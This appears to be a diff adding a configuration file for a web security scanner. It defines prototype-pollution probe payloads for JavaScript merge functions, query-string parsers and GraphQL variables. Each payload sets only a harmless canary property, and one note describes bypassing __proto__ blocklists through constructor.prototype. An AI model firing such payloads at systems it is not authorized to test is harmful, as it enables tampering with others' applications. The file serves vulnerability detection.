@@ -1,0 +1,47 @@
+family_id: prototype_pollution
+description: >-
+  Prototype-pollution probes targeting JS object-merge sinks (lodash.merge,
+  jQuery extend, Express body-parser). Seeds set a single non-sensitive
+  marker property; the validator confirms pollution by reading the marker
+  back from a benign endpoint.
+cwe_ids: [1321]
+owasp_top10:
+  - 'A08:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: proto_marker
+    template: '{"__proto__":{"argusCanary":"{canary}"}}'
+    confidence: likely
+    notes: Direct __proto__ pollution with a marker property.
+  - id: nested_proto
+    template: '{"a":{"__proto__":{"argusCanary":"{canary}"}}}'
+    confidence: likely
+    notes: Nested __proto__; some merges only walk one level deep.
+  - id: constructor_proto
+    template: '{"constructor":{"prototype":{"argusCanary":"{canary}"}}}'
+    confidence: suspected
+    notes: constructor.prototype path; bypasses __proto__ blocklists.
+  - id: query_string_proto
+    template: '__proto__[argusCanary]={canary}'
+    confidence: likely
+    notes: qs/query-string parser variant.
+  - id: bracket_proto
+    template: '__proto__.argusCanary={canary}'
+    confidence: suspected
+    notes: Dot-notation in query-string parsers (express-validator quirk).
+  - id: graphql_variables
+    template: '{"variables":{"__proto__":{"argusCanary":"{canary}"}}}'
+    confidence: suspected
+    notes: GraphQL-variables sink; tests Apollo Server's deep-merge logic.
+mutations:
+  - name: case_flip
+    description: Property names are case-sensitive in JS; flips produce known errors.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw JSON / form payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded query-string variants.
